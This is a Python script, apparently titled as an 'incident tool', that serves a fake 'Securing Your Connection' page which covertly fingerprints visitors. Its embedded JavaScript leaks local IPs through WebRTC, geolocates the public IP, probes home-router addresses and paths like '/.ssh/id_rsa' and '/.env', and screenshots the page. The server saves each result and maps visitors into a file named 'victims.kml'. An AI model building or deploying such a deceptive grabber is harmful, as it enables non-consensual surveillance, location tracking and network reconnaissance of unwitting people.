# incident_tool.py
# 🔐 GUARANTEED: Creates folder + saves to reports/report.txt
# + Screenshot, KML, LAN Scan, File Hints, Network Detection
# Run: python incident_tool.py
# Visit: http://localhost:5000

import http.server
import socketserver
import json
import os
import base64
from datetime import datetime

# === Ensure 'reports' folder exists ===
os.makedirs("reports", exist_ok=True)
print(f"[📁] Folder ready: {os.path.abspath('reports')}")

# === HTML + JS: Collects all intel ===
HTML = '''
<!DOCTYPE html>
<html>
<head><title>Loading</title></head>
<body style="text-align:center;padding:50px;font-family:Arial;">
  <h2>🔐 Securing Your Connection...</h2>
  <p>Please wait while we verify your session.</p>

  <!-- Load html2canvas -->
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>

  <script>
    // Wait 5 seconds (simulate fake load)
    setTimeout(() => {
      document.body.innerHTML = "<h2>✅ Session Secured</h2>";
      collectAndSend();
    }, 5000);

    async function collectAndSend() {
      const data = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: screen.width + 'x' + screen.height,
        viewport: [window.innerWidth, window.innerHeight],
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hasLocalStorage: !!localStorage,
        hasWebGL: !!document.createElement('canvas').getContext('webgl'),
        online: navigator.onLine,
        networkType: navigator.connection?.effectiveType || 'unknown',
        rtt: navigator.connection?.rtt || 'N/A',
        localIps: await getLocalIps(),
        ipInfo: await getPublicIp(),
        lanScan: await scanLAN(),
        fileHints: await probeFiles()
      };

      // Take screenshot
      const canvas = await html2canvas(document.body, { scale: 1 });
      data.screenshot = canvas.toDataURL('image/png');

      // Send to server
      fetch('/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
      });
    }

    // Get internal IPs via WebRTC
    function getLocalIps() {
      return new Promise(resolve => {
        const pc = new RTCPeerConnection({ iceServers: [] });
        const ips = [];
        pc.onicecandidate = e => {
          if (e.candidate) {
            const ip = e.candidate.address;
            if (ip && !ips.includes(ip)) ips.push(ip);
          } else {
            resolve(ips.length ? ips : ['none']);
          }
        };
        pc.createDataChannel('');
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
        setTimeout(() => resolve(ips), 2000);
      });
    }

    // Get public IP + location
    async function getPublicIp() {
      try {
        const res = await fetch('https://ipinfo.io/json');
        const d = await res.json();
        if (d.loc) {
          const [lat, lon] = d.loc.split(',');
          d.googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
        }
        return d;
      } catch (e) {
        return { ip: 'unknown', city: 'N/A', country: 'N/A', loc: '0,0' };
      }
    }

    // Scan common internal IPs
    async function scanLAN() {
      const hosts = ['192.168.1.1', '10.0.0.1', '192.168.0.1', '172.16.0.1'];
      const results = {};
      for (const h of hosts) {
        results[h] = await fetch(`http://${h}`, { mode: 'no-cors', timeout: 1000 })
          .then(() => 'reachable').catch(() => 'timeout');
      }
      return results;
    }

    // Check for sensitive files
    async function probeFiles() {
      const files = ['/robots.txt', '/.env', '/.git/config', '/.ssh/id_rsa'];
      const results = {};
      for (const f of files) {
        results[f] = await fetch(f, { method: 'HEAD', mode: 'no-cors' })
          .then(() => 'exists').catch(() => 'not found');
      }
      return results;
    }
  </script>
</body>
</html>
'''

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(HTML.encode())

    def do_POST(self):
        try:
            # Read incoming data
            content_length = int(self.headers['Content-Length'])
            body = self.rfile.read(content_length)

            # Parse JSON
            try:
                data = json.loads(body)
            except:
                data = {"error": "json_parse_failed", "raw": body.decode('utf-8', errors='ignore')}

            # === ✅ SAVE TO reports/report.txt ===
            file_path = "reports/report.txt"

            ip_info = data.get('ipInfo', {})
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            report = f"""
🔐 INCIDENT INVESTIGATION REPORT
{'='*60}
🕒 Server Time:     {timestamp}
🕒 Client Time:     {data.get('timestamp', 'N/A')}
🌍 Public IP:       {ip_info.get('ip', 'N/A')}
📍 City:            {ip_info.get('city', 'N/A')}
📍 Country:         {ip_info.get('country', 'N/A')}
gMaps: {ip_info.get('googleMaps', 'N/A')}

🖥️ DEVICE & BROWSER
{'-'*40}
• OS:              {data.get('platform', 'N/A')}
• Browser:         {data.get('userAgent', 'N/A')[:80]}...
• Screen:          {data.get('screen', 'N/A')}
• Viewport:        {data.get('viewport', 'N/A')}
• Language:        {data.get('language', 'N/A')}
• Timezone:        {data.get('timezone', 'N/A')}
• WebGL:           {data.get('hasWebGL', 'N/A')}
• Local Storage:   {data.get('hasLocalStorage', 'N/A')}
• Online:          {data.get('online', 'N/A')}

📡 NETWORK DETECTION
{'-'*40}
• Network Type:    {data.get('networkType', 'N/A')}
• RTT (Latency):   {data.get('rtt', 'N/A')} ms
• Local IPs:       {', '.join(data.get('localIps', ['N/A']))}

🔍 LAN SCAN (Internal IPs)
{'-'*40}
"""
            for host, status in data.get('lanScan', {}).items():
                report += f"  {host} → {status}\n"

            report += f"""
📁 FILE SYSTEM HINTS
{'-'*40}
"""
            for path, status in data.get('fileHints', {}).items():
                report += f"  {path} → {status}\n"

            report += f"""
📸 SCREENSHOT
{'-'*40}
• Saved as: reports/screenshot.png

✅ This report was automatically saved to:
   {os.path.abspath(file_path)}

"""
            # === ✅ WRITE TO FILE ===
            try:
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(report.strip() + '\n')
                print(f"[✅ SAVED] {os.path.abspath(file_path)}")  # Confirm full path
            except Exception as e:
                print(f"[❌ WRITE FAILED] {e}")
                # Fallback: try desktop
                desktop_file = os.path.join(os.path.expanduser("~"), "Desktop", "report.txt")
                try:
                    with open(desktop_file, 'w', encoding='utf-8') as f:
                        f.write(report.strip() + '\n')
                    print(f"[✅ SAVED TO DESKTOP] {desktop_file}")
                except Exception as e2:
                    print(f"[❌ DESKTOP SAVE FAILED] {e2}")

            # === SAVE SCREENSHOT ===
            if data.get('screenshot'):
                try:
                    img_data = data['screenshot'].split(',')[1]
                    with open("reports/screenshot.png", "wb") as f:
                        f.write(base64.b64decode(img_data))
                    print("[✅ SCREENSHOT SAVED] reports/screenshot.png")
                except Exception as e:
                    print(f"[❌ SCREENSHOT SAVE FAILED] {e}")

            # === UPDATE KML (Google Earth) ===
            self.update_kml(ip_info)

            # Respond
            self.send_response(201)
            self.end_headers()

        except Exception as e:
            print(f"[❌ POST ERROR] {e}")
            self.send_response(500)
            self.end_headers()

    def update_kml(self, ip_info):
        """Append to victims.kml"""
        try:
            loc = ip_info.get('loc', '')
            if not loc or 'N/A' in loc:
                return
            lat, lon = loc.split(',')
            ip = ip_info.get('ip', 'Unknown')

            is_new = not os.path.exists("victims.kml")
            with open("victims.kml", "a") as f:
                if is_new:
                    f.write('''<?xml version="1.0" encoding="UTF-8"?>
<kml xmlns="http://www.opengis.net/kml/2.2">
<Document>
  <name>Victims</name>
''')
                f.write(f'''
  <Placemark>
    <name>{ip}</name>
    <description>{ip_info.get('city', 'N/A')}, {ip_info.get('country', 'N/A')}</description>
    <Point><coordinates>{lon},{lat},0</coordinates></Point>
  </Placemark>
''')
            print("[🗺️ KML UPDATED] victims.kml")
        except Exception as e:
            print(f"[❌ KML ERROR] {e}")

# === RUN SERVER ===
if __name__ == "__main__":
    print("\n🚀 INCIDENT TOOL STARTED")
    print("📁 Will auto-create: ./reports/")
    print("📄 Will save: reports/report.txt")
    print("🖼️  Screenshot: reports/screenshot.png")
    print("🗺️  Map: victims.kml")
    print("👉 Visit: http://localhost:5000\n")

    # Force create reports folder
    os.makedirs("reports", exist_ok=True)

    with socketserver.TCPServer(("", 5000), Handler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n🛑 Server stopped.")
            print(f"📄 Check: {os.path.abspath('reports/report.txt')}")